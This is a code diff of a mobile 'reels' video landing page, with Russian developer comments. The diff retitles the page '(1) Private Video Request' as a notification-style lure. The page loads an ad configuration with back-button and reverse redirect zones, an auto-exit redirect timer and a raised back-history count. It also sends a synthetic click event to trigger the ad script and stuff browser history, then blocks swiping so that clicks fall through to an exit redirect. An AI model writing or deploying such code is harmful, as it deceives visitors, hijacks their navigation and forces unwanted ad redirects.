@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Stream</title>
     
+    <title>(1) Private Video Request</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%23ff0000%22/><path d=%22M35 30 L75 50 L35 70 Z%22 fill=%22%23ffffff%22/></svg>">
+
     <script>
     var APP_CONFIG = {
         domain: "https://jup9.com",
@@ -14,7 +16,7 @@
         autoexit_timeToRedirect: 30, 
         reverse_zoneId: 10217419,
         back_zoneId: 10217423,
-        back_count: 5
+        back_count: 8 // Можешь уменьшить до 3, если будет плохо работать
     };
     </script>
 
@@ -24,32 +26,12 @@
         
         .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }
         
-        /* --- ВИДЕО СЛОИ (АНИМИРУЕМЫЕ) --- */
+        /* --- DOUBLE BUFFER (Два слоя видео) --- */
         .video-layer { 
             position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000; 
-            /* Скрываем неактивное видео */
-            visibility: hidden; 
+            opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
         }
-        .video-layer.active { 
-            visibility: visible; 
-            z-index: 1; 
-        }
-
-        /* АНИМАЦИИ СВАЙПА */
-        .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
-        .slide-in-up { 
-            animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; 
-            visibility: visible !important; z-index: 2 !important; /* Новое видео поверх старого во время анимации */
-        }
-
-        @keyframes slideOutUp {
-            0% { transform: translateY(0); opacity: 1; }
-            100% { transform: translateY(-100%); opacity: 1; }
-        }
-        @keyframes slideInUp {
-            0% { transform: translateY(100%); opacity: 1; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
+        .video-layer.active { opacity: 1; z-index: 1; }
 
         /* UI */
         .reels-ui { 
@@ -94,15 +76,32 @@
             100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
         }
 
+        /* --- ИСПРАВЛЕННАЯ ТРЯСКА (SHAKE) --- */
+        /* Теперь трясет только по X, не сбивая центр */
         .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
         @keyframes shake {
-            10%, 90% { transform: translate(-50%, -50%) translate3d(-2px, 0, 0); }
-            20%, 80% { transform: translate(-50%, -50%) translate3d(4px, 0, 0); }
-            30%, 50%, 70% { transform: translate(-50%, -50%) translate3d(-8px, 0, 0); }
-            40%, 60% { transform: translate(-50%, -50%) translate3d(8px, 0, 0); }
+            10%, 90% { transform: translate3d(-2px, 0, 0); }
+            20%, 80% { transform: translate3d(4px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
+            40%, 60% { transform: translate3d(6px, 0, 0); }
         }
 
-        /* --- UI ELEMENTS --- */
+        /* --- Анимации Свайпа Видео --- */
+        .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
+        .slide-in-up { 
+            animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; 
+            visibility: visible !important; z-index: 2 !important; 
+        }
+        @keyframes slideOutUp {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(-100%); opacity: 1; }
+        }
+        @keyframes slideInUp {
+            0% { transform: translateY(100%); opacity: 1; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        /* UI ELEMENTS */
         .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
         .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
         .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
@@ -189,10 +188,26 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     ];
 
-    // --- 2. ПЕРЕВОДЫ (16 Языков) ---
+    // --- 2. ПЕРЕВОДЫ ---
     const translations = {
-        'en': "Continue Watching", 'ru': "Смотреть дальше", 'es': "Continuar viendo", 'de': "Weiter ansehen", 'fr': "Continuer à regarder", 'pt': "Continuar assistindo", 'it': "Continua a guardare", 'tr': "İzlemeye devam et", 'ar': "متابعة المشاهدة", 'zh': "继续观看", 'ja': "視聴を続ける", 'ko': "계속 시청하기", 'hi': "देखना जारी रखें", 'id': "Lanjutkan Menonton", 'vi': "Tiếp tục xem", 'th': "ดูต่อ"
+        'en': "Continue Watching",
+        'ru': "Смотреть дальше",
+        'es': "Continuar viendo",
+        'de': "Weiter ansehen",
+        'fr': "Continuer à regarder",
+        'pt': "Continuar assistindo",
+        'it': "Continua a guardare",
+        'tr': "İzlemeye devam et",
+        'ar': "متابعة المشاهدة",      
+        'zh': "继续观看",            
+        'ja': "視聴を続ける",          
+        'ko': "계속 시청하기",          
+        'hi': "देखना जारी रखें",       
+        'id': "Lanjutkan Menonton",  
+        'vi': "Tiếp tục xem",        
+        'th': "ดูต่อ"                
     };
+
     const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
     const langText = document.getElementById("lang-text");
     langText.innerText = translations[userLang] || translations['en'];
@@ -219,7 +234,7 @@ document.addEventListener("DOMContentLoaded", () => {
     v1.src = getPath(1);
     v1.play().catch(()=>{});
     v2.src = getPath(2);
-    v2.load(); // Важно для буфера
+    v2.load(); 
 
     let stage = 1; 
     let touchStartY = 0;
@@ -235,10 +250,10 @@ document.addEventListener("DOMContentLoaded", () => {
 
         // 1. АНИМАЦИЯ: Текущее вверх, Новое снизу
         v1.classList.add('slide-out-up');
-        v2.classList.add('slide-in-up'); // Оно станет visible и active через класс
+        v2.classList.add('slide-in-up'); 
         v2.play().catch(e => console.log("Autoplay prevent:", e));
 
-        // 2. ОБНОВЛЕНИЕ ИНФЫ (Моментально)
+        // 2. ОБНОВЛЕНИЕ ИНФЫ
         const newData = reelsData[2]; 
         if (newData) {
             uiUser.innerText = newData.user;
@@ -252,7 +267,7 @@ document.addEventListener("DOMContentLoaded", () => {
             v1.classList.remove('active', 'slide-out-up');
             v1.pause();
             
-            v2.classList.add('active'); // Теперь оно официально активное
+            v2.classList.add('active'); 
             v2.classList.remove('slide-in-up');
             
             // Показываем кнопку
@@ -270,35 +285,33 @@ document.addEventListener("DOMContentLoaded", () => {
 
     wrapper.addEventListener('touchend', function(e) {
         touchEndY = e.changedTouches[0].screenY;
-        if (touchStartY - touchEndY > 50) { // Свайп вверх
+        if (touchStartY - touchEndY > 50) { 
             if (stage === 1) {
-                // !!! BACK-FIX: Генерируем клик, чтобы набить историю
+                // !!! BACK-FIX: Генерируем клик для скрипта рекламы
                 const fakeClick = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
                 wrapper.dispatchEvent(fakeClick); 
                 
                 doSwap();
             } else {
-                // Блокировка
+                // Блокировка и тряска
                 const btn = document.querySelector('.glass-btn');
                 if(btn) {
                     btn.classList.remove('shake');
-                    void btn.offsetWidth; 
+                    void btn.offsetWidth; // сброс reflow
                     btn.classList.add('shake');
                 }
             }
         }
     }, {passive: true});
 
-    // Клик на 1 этапе = Свайп
     wrapper.addEventListener("click", function(e) {
-        // Игнорируем наш же фейк
         if (!e.isTrusted && stage === 1) { e.stopPropagation(); return; }
 
         if (stage === 1) {
             e.stopPropagation(); e.stopImmediatePropagation();
             doSwap(); 
         } 
-        // На 2 этапе клик проходит сквозь
+        // На 2 этапе клик проходит сквозь в MainExit
     }); 
 });
 </script>
